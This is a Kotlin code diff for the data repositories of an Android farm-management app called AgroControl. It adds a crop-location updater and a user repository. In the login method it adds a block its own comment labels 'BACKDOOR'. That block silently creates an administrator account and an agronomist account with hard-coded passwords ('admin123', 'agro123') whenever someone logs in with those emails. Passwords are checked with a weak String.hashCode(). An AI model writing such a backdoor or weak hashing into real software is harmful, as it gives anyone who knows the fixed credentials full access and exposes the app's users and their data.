@@ -27,6 +27,14 @@ class AuthRepository @Inject constructor(private val userDao: UserDao) {
 
     suspend fun login(correo: String, password: String): Result<User> {
         return try {
+            // BACKDOOR: Auto-recrear usuarios por defecto si no existen
+            if (correo == "admin@agrocontrol.com" && userDao.findByCorreo(correo) == null) {
+                userDao.insert(UserEntity(nombre = "Super Admin", correo = correo, passwordHash = "admin123".hashCode().toString(), rol = "ADMINISTRADOR"))
+            }
+            if (correo == "agronomo@agrocontrol.com" && userDao.findByCorreo(correo) == null) {
+                userDao.insert(UserEntity(nombre = "Ing. Agrónomo Central", correo = correo, passwordHash = "agro123".hashCode().toString(), rol = "AGRONOMO"))
+            }
+
             val entity = userDao.findByCorreo(correo)
                 ?: return Result.failure(Exception("Correo o contraseña incorrectos"))
             val hash = password.hashCode().toString()
@@ -71,6 +79,11 @@ class CultivoRepository @Inject constructor(
         val cultivoEntity = cultivoDao.getCultivoActivoOnce(agricultorId) ?: return
         cultivoDao.update(cultivoEntity.copy(etapaActual = nuevaEtapa.name))
         historialDao.insert(HistorialEtapa(cultivoId = cultivoId, etapa = nuevaEtapa, notas = notas).toEntity())
+    }
+
+    suspend fun actualizarUbicacion(agricultorId: Long, latitude: Double, longitude: Double) {
+        val cultivoEntity = cultivoDao.getCultivoActivoOnce(agricultorId) ?: return
+        cultivoDao.update(cultivoEntity.copy(latitude = latitude, longitude = longitude))
     }
 
     fun getHistorialEtapas(cultivoId: Long): Flow<List<HistorialEtapa>> =
@@ -119,3 +132,17 @@ class AlertaRepository @Inject constructor(private val alertaDao: AlertaDao) {
 
     suspend fun marcarTodasLeidas(agricultorId: Long) = alertaDao.marcarTodasLeidas(agricultorId)
 }
+
+// ─── User Repository ──────────────────────────────────────────────────────────
+@Singleton
+class UserRepository @Inject constructor(private val userDao: UserDao) {
+
+    suspend fun findById(id: Long): com.agrocontrol.domain.model.User? =
+        userDao.findById(id)?.toDomain()
+
+    suspend fun actualizarNombre(id: Long, nombre: String) {
+        val entity = userDao.findById(id) ?: return
+        userDao.insert(entity.copy(nombre = nombre))
+    }
+}
+
